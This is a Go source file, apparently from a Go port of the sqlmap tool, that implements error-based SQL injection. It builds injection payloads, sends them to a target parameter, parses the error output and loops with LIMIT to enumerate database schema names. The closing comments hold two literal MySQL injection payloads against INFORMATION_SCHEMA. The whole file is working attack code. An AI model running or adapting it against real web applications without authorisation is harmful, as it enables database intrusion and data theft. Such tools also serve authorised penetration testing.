package error

import (
	"fmt"
	"github.com/KpLi0rn/Gosqlmap/lib/core"
	"github.com/KpLi0rn/Gosqlmap/lib/data"
	"github.com/KpLi0rn/Gosqlmap/lib/log"
	"github.com/KpLi0rn/Gosqlmap/lib/request"
	"github.com/KpLi0rn/Gosqlmap/lib/utils"
	"strconv"
	"strings"
)

// 从conf中获取 payload
func ErrorUse(expression string) {
	/**
	sqlmap 是采用 limit 来进行注入结果的枚举的
	sqlmap 原来的部分太过于复杂，我这边简化一下
	 */
	var stopLimit int
	expressionField := core.SQLAgent.GetFields(expression) // 取出 payload 中的 schema_name 部分
	if len(data.Configure.Dbms) != 0 {
		count,_ := utils.GetInner(data.Configure.Queries[data.Configure.Dbms],"count")
		countedExpression := strings.Replace(expression,expressionField,fmt.Sprintf(count["query"],expressionField),-1)
		countedExpressionFields := core.SQLAgent.GetFields(countedExpression)
		dbsCounts := _oneShotErrorUse(countedExpression,countedExpressionFields)
		if len(dbsCounts) != 0{
			dbsCounts, _ := strconv.Atoi(dbsCounts)
			stopLimit = dbsCounts
		}
		if stopLimit > 1{
			// sqlmap 这里是多线程的一个机制，但是我这边单线程就行了，循环来获取数据
			for i:=0;i<stopLimit;i++ {
				output := _errorFields(expression,expressionField,i)
				log.Info(output)
			}
		}
	}

}

func _oneShotErrorUse(expression string,field string) string {
	var retVal string
	for {
		check := fmt.Sprintf("(?si)%s(?P<result>.*?)%s",data.Kb.Chars.Start,data.Kb.Chars.Stop)
		//trimCheck := fmt.Sprintf("(?si)%s(?P<result>[^<\n]*)",data.Kb.Chars.Start)
		var nulledCastedField string
		if len(field) != 0 {
			nulledCastedField = core.SQLAgent.NullAndCastField(field)
		}
		vector := data.Kb.Vector
		query := core.SQLAgent.PrefixQuery("",vector,0,"")
		query = core.SQLAgent.SuffixQuery("","",query,0)

		injExpression := strings.Replace(expression,field,nulledCastedField,-1)
		injExpression = strings.Replace(query,"[QUERY]",injExpression,-1)
		injExpression = fmt.Sprintf("%s %s %s",data.Kb.Prefix,injExpression,data.Kb.Suffix)
		// 参数拼接
		payload := core.SQLAgent.Payload(data.Kb.Place,data.Kb.Parameter, core.SQLAgent.CleanupPayload(injExpression,""),0)
		//fmt.Println(payload)

		page,_,_ := request.QueryPage(payload,data.Kb.Place)
		output := core.ExtractRegexResult(check,page)

		if len(output) != 0 {

			retVal = output
			break
		}
	}
	return retVal
	// 11' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170627671,(SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,451) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x71706b7171,0x78))s), 8446744073709551610, 8446744073709551610)))-- Gpey
    // id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('qpbvq',(SELECT CAST(COUNT(schema_name) AS NCHAR) FROM INFORMATION_SCHEMA.SCHEMATA),'qpkqq','x'))s), 8446744073709551610, 8446744073709551610)))  -- XoEF
}

func _errorFields(expression,expressionField string,num int) string{
	field := expressionField
	origExpr := expression
	expression = core.SQLAgent.LimitQuery(num, origExpr, field)
	output := _oneShotErrorUse(expression,field)
	return output
}